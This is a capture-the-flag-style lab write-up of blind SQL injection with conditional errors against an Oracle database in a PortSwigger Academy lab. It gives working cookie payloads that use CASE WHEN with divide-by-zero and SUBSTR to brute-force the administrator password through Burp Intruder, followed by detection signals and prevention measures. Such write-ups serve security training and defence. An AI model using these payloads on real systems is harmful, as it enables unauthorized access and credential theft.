# Blind SQL Injection with Conditional Errors (Oracle)

## Table of Contents
- [Introduction](#introduction)
- [Why This Attack Works](#why-this-attack-works)
- [Lab Setup](#lab-setup)
- [Prerequisites](#prerequisites)
- [Attack Flow](#attack-flow)
- [Step-by-Step Walkthrough](#step-by-step-walkthrough)
- [Detection](#detection)
- [Prevention](#prevention)
- [References](#references)
- [Key Takeaways](#key-takeaways)

## Introduction

This writeup covers a blind SQL injection attack against an Oracle-backed web application, exploiting a `TrackingId` cookie value that gets used directly in a SQL query. Unlike a classic SQLi where I can see database output on the page, this one gives me nothing visible — no error message, no data reflected back. The only signal I have is whether the server responds with a normal page or throws an internal error. I use that binary signal (error vs no error) to extract the administrator's password one character at a time.

This is commonly known as **Blind SQL Injection with Conditional Errors**, and it's one of the core techniques every pentester needs to have in their toolkit because a lot of real-world apps don't leak SQL errors directly but still process malicious input server-side.

## Why This Attack Works

The application takes the value of the `TrackingId` cookie and inserts it directly into a SQL query without sanitizing or parameterizing it. Because the query is built through string concatenation, I can break out of the intended string context using a single quote and inject my own SQL logic.

The key trick here is turning a **boolean condition** into a **server error**. Oracle's `CASE WHEN` expression lets me run one branch of code if a condition is true and another if it's false. By putting a guaranteed-to-fail expression (`1/0`, a divide-by-zero) inside the "true" branch, I force the server to throw a HTTP 500 error only when my injected condition evaluates to true. When the condition is false, the query resolves cleanly and I get a normal HTTP 200 response.

Since I can't see any data directly, this error/no-error behavior becomes my entire communication channel with the database.

## Lab Setup

| Component | Details |
|---|---|
| Target | PortSwigger Web Security Academy — Blind SQLi lab |
| Database | Oracle |
| Injection Point | `TrackingId` cookie |
| Tools Used | Burp Suite (Proxy, Repeater, Intruder) |
| Attack Type | Blind SQL Injection — Conditional Errors |

## Prerequisites

| Requirement | Purpose |
|---|---|
| Burp Suite (Community/Pro) | Intercept, modify, and automate requests |
| Basic SQL knowledge | Understand `CASE WHEN`, `SUBSTR`, `ROWNUM` |
| Browser + Burp proxy configured | Capture the `TrackingId` cookie in transit |

## Attack Flow

1. Confirm the cookie value is injectable using quote-based syntax errors.
2. Identify the underlying database type (Oracle, via the `dual` table trick).
3. Confirm the injection actually reaches the SQL engine.
4. Confirm the `users` table exists.
5. Convert a true/false condition into a detectable error using `CASE WHEN` + divide-by-zero.
6. Confirm the `administrator` account exists.
7. Determine the password length.
8. Brute-force each character of the password using Burp Intruder.
9. Log in as `administrator` with the recovered password.

## Step-by-Step Walkthrough

### Step 1 — Confirm the Injection Point

I intercept the front page request in Burp and modify the `TrackingId` cookie.

```
TrackingId=xyz'
```

| Payload | Result | Meaning |
|---|---|---|
| `xyz'` | Error returned | Single quote breaks the query syntax |
| `xyz''` | No error | Escaped quote closes the string cleanly |

This confirms the input affects a query somewhere on the backend.

### Step 2 — Identify the Database Type

```
TrackingId=xyz'||(SELECT '')||'
```

Still errors — Oracle requires every `SELECT` to reference a table, even for a dummy value. So I test:

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

| Payload | Result | Flag |
|---|---|---|
| `SELECT ''` (no table) | Error | Not valid Oracle syntax |
| `SELECT '' FROM dual` | No error | Confirms Oracle DB |

`dual` is Oracle's built-in dummy table used for exactly this kind of syntax requirement.

### Step 3 — Confirm the Query Actually Executes Server-Side

```
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```

| Payload | Result | Meaning |
|---|---|---|
| Valid table (`dual`) | No error | Query executes fine |
| Fake table name | Error | Confirms real SQL execution, not just string handling |

### Step 4 — Confirm the `users` Table Exists

```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

No error returned, so the `users` table exists. `ROWNUM = 1` keeps the subquery to a single row so it doesn't break the string concatenation.

### Step 5 — Turn a Condition Into an Error (Core Technique)

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

| Condition | Payload Result | Interpretation |
|---|---|---|
| `1=1` (true) | Error (HTTP 500) | True branch executes `1/0` |
| `1=2` (false) | No error (HTTP 200) | False branch returns empty string |

This confirms I can trigger an error conditionally based on any SQL expression I control.

### Step 6 — Confirm the `administrator` Account Exists

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Error returned, confirming a row exists where `username='administrator'`.

### Step 7 — Determine Password Length

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

| Test | Result |
|---|---|
| `LENGTH(password)>1` | Error (true) |
| `LENGTH(password)>2` | Error (true) |
| ... incrementing ... | ... |
| `LENGTH(password)>20` | No error (false) |

Password length confirmed at **20 characters** — the point where the error stops appearing.

### Step 8 — Brute-Force Each Character with Burp Intruder

Base payload sent to Intruder:

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

| Setting | Value |
|---|---|
| Attack Type | Sniper |
| Payload Position | Character inside `SUBSTR(password,1,1)='§a§'` |
| Payload Set | Simple list: `a-z`, `0-9` |
| Success Indicator | HTTP 500 status code |

I check the "Status" column in Intruder results — whichever payload produced a `500` is the correct character at that position.

For each subsequent character, I change the offset in `SUBSTR(password, N, 1)`:

```
SUBSTR(password,2,1)='§a§'
SUBSTR(password,3,1)='§a§'
```

...and repeat the attack until all 20 positions are recovered.

### Step 9 — Log In

Once the full password string is assembled from the character-by-character results, I go to the login page and authenticate as `administrator` using the recovered credentials.

## Detection

Since this attack lives entirely in HTTP request/response behavior, detection here is application/WAF-log based rather than Windows Event IDs.

| Signal | What to Look For |
|---|---|
| Abnormal cookie values | `TrackingId` containing quotes, `SELECT`, `CASE WHEN`, `SUBSTR`, `dual` |
| High-frequency requests | Intruder-style brute force generates dozens of near-identical requests differing by one character |
| Repeated HTTP 500 spikes | Sudden clustering of server errors tied to a single session/cookie |
| WAF/IDS signatures | Rules flagging SQL keywords inside cookie or header values, not just query params |

## Prevention

| Prevention Method | Description |
|---|---|
| Parameterized Queries | Never concatenate user input directly into SQL statements |
| Least Privilege DB Accounts | App's DB user should not have access to sensitive tables like `users` beyond what's needed |
| Generic Error Pages | Don't let internal server errors (500s) leak distinguishable behavior — return uniform error responses |
| Input Validation | Reject cookie/header values containing SQL metacharacters where they're not expected |
| WAF Rules | Detect and block SQL injection patterns in all input vectors, including cookies |

## References

| Source | Link |
|---|---|
| PortSwigger Web Security Academy | https://portswigger.net/web-security/sql-injection/blind |
| OWASP - SQL Injection | https://owasp.org/www-community/attacks/SQL_Injection |
| PayloadsAllTheThings - SQL Injection | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection |

## Key Takeaways

- Blind SQLi doesn't need visible data leakage — a simple true/false signal (error vs no error) is enough to extract data.
- Oracle syntax quirks (`dual` table, `||` concatenation) are a reliable fingerprint for identifying the DB engine during blind testing.
- `CASE WHEN` combined with a guaranteed-error expression (`1/0`) is the core primitive that converts logic into observable behavior.
- Burp Intruder turns a slow manual character-guessing process into an automated one, which is essential once you move past confirming length into full data extraction.
- Generic error handling and parameterized queries are the two biggest wins for shutting this class of attack down.